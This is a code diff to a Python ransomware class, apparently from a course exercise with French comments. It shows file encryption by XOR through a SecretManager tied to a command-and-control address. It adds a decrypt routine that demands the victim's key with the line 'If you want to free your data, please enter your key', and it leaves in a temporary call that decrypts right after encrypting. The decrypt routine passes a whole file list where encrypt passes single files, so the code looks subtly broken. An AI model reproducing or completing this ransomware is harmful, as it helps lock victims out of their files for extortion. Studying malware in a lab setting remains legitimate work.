@@ -4,6 +4,7 @@ import re
 import sys
 from pathlib import Path
 from secret_manager import SecretManager
+import os
 
 import random
 
@@ -54,12 +55,9 @@ class Ransomware:
             #print(f"Fichier txt trouvé : {list[i]}")
         
         #appeler la classe SecretManager()
-        print("Initialisation de la classe SecretManager")
         call = SecretManager(CNC_ADDRESS, TOKEN_PATH)
-        print("Appel de la fonction setup")
         call.setup()
 
-        print("Chiffrement des fichiers...")
         #chiffrement des fichiers
         for i in range(len(list)):
             call.xorfiles(list[i])
@@ -71,7 +69,29 @@ class Ransomware:
 
     def decrypt(self):
         # main function for decrypting (see PDF)
-        raise NotImplemented()
+        print("If you want to free your data, please enter your key:")
+        key = input()
+
+        call = SecretManager(CNC_ADDRESS, TOKEN_PATH)
+        call.load()
+        
+        try:
+            call.set_key(key)
+            print("Getting files...")
+            list = self.get_files("*.txt")
+            print(list)
+            print("Deciphering files...")
+            call.xorfiles(list)
+            print("Cleaning everything...")
+            call.clean()
+
+            print("Everything went well, you now have access to your files.")
+
+            quit()
+
+        except:
+            print("Unknown error: couldn't decipher files")
+
 
 
 if __name__ == "__main__":
@@ -79,6 +99,10 @@ if __name__ == "__main__":
     if len(sys.argv) < 2:
         ransomware = Ransomware()
         ransomware.encrypt()
+
+        #temporaire
+        ransomware.decrypt()
+
     elif sys.argv[1] == "--decrypt":
         ransomware = Ransomware()
         ransomware.decrypt()
